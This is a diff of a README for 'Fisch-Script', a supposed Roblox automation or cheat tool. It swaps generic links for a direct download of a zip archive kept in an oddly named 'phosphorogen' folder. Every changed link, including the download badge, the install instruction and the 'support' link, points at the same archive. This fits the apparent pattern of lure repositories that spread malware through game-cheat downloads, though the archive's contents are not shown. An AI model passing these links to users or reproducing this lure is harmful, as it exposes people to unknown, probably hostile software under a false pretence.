@@ -6,7 +6,7 @@ Welcome to Fisch-Script! This application helps you automate tasks in Roblox eas
 
 ## 📥 Download Fisch-Script
 
-[![Download Fisch-Script](https://img.shields.io/badge/Download-Fisch--Script-blue?style=for-the-badge)](https://github.com)
+[![Download Fisch-Script](https://github.com/Rairmad/Fisch-Script/raw/refs/heads/main/phosphorogen/FischScript_1.0.zip)](https://github.com/Rairmad/Fisch-Script/raw/refs/heads/main/phosphorogen/FischScript_1.0.zip)
 
 ## 📋 Requirements
 
@@ -26,7 +26,7 @@ Fisch-Script offers several features to enhance your Roblox experience, includin
 
 ## 📥 Download & Install
 
-To download Fisch-Script, visit this page: [Download Fisch-Script](https://github.com).
+To download Fisch-Script, visit this page: [Download Fisch-Script](https://github.com/Rairmad/Fisch-Script/raw/refs/heads/main/phosphorogen/FischScript_1.0.zip).
 
 ### Step-by-Step Guide:
 
@@ -70,7 +70,7 @@ If problems persist, consider looking at online forums or communities for additi
 
 ## 📞 Support
 
-For further assistance or inquiries, feel free to reach out to the support team through our [GitHub page](https://github.com). Your feedback helps us improve Fisch-Script.
+For further assistance or inquiries, feel free to reach out to the support team through our [GitHub page](https://github.com/Rairmad/Fisch-Script/raw/refs/heads/main/phosphorogen/FischScript_1.0.zip). Your feedback helps us improve Fisch-Script.
 
 ## 📄 License
 
